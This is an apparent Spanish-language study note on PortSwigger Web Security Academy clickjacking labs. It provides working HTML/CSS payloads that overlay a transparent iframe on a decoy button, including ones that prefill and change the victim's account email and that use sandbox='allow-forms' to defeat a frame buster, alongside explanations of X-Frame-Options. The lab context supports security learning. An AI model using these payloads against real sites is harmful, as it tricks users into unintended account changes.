# Clickjacking

## Basic clickjacking with CSRF token protection

Un iframe permite cargar una pagina encima de otra de aqui proviene esta vulnerabilidad que se engaña al usuario a que haga clic en 
un lugar donde no deberia haciendo el iframe trasparente. SOlo funciona si las paginas permiten iframes si los iframe are allow( frame en ingles els cuadro marco)

```
<style>
    iframe {
        position:relative;
        width:$width_value;
        height: $height_value;
        opacity: $opacity;
        z-index: 2;
    }
    div {
        position:absolute;
        top:$top_value;
        left:$side_value;
        z-index: 1;
    }
</style>
<div>Test me</div>
<iframe src="AQUI PON LA URL LA CUAL SE VA PONER ENSIMA EL DIV></iframe>

```
## Clickjacking with form input data prefilled from a URL parameter

Es basicamente lo mismo del ejemplo pero  cargando datos para cambiar el email 

```
<style>
    iframe {
        position:relative;
        width:700px;
        height: 700px;
        opacity: 0.0001;
        z-index: 2;
    }
    div {
        position:absolute;
        top:450px;
        left:60px;
        z-index: 1;
    }
</style>
<div>CLICK ME</div>
<iframe src="https://0a96006303e0a89fc01f20c700340002.web-security-academy.net/my-account/?email=hacker@attacker-website.com"></iframe>
```

## Clickjacking with a frame buster script

Se crearon protecciones para evitar esto una de ellas es la cabecera X-Frame-Options:

>The server-side header X-Frame-Options can permit or forbid displaying the page inside a frame.

It must be sent exactly as HTTP-header: the browser will ignore it if found in HTML <meta> tag. So, <meta http-equiv="X-Frame-Options"...> won’t do anything.

The header may have 3 values:

DENY
Never ever show the page inside a frame.

Otra medida de seguridad es el Sandbox attribute 

>One of the things restricted by the sandbox attribute is navigation. A sandboxed iframe may not change top.location.

> So we can add the iframe with sandbox="allow-scripts allow-forms". That would relax the restrictions, permitting scripts and forms. But we omit allow-top-navigation so that changing top.location is forbidden.


> https://javascript.info/

Para este ejemplo se uso sandbox="allow-forms" para desactivar las protecciones.

```

<style>
    iframe {
        position:relative;
        width:700px;
        height: 600px;
        opacity: 0.0001;
        z-index: 2;
    }
    div {
        position:absolute;
        top:450px;
        left:80px;
        z-index: 1;
    }
</style>
<div>Click me</div>
<iframe sandbox="allow-forms"
src="https://0a1b004903f71dc0c0795dd000a8006a.web-security-academy.net/my-account/?email=hacker@attacker-website.com"></iframe>

```
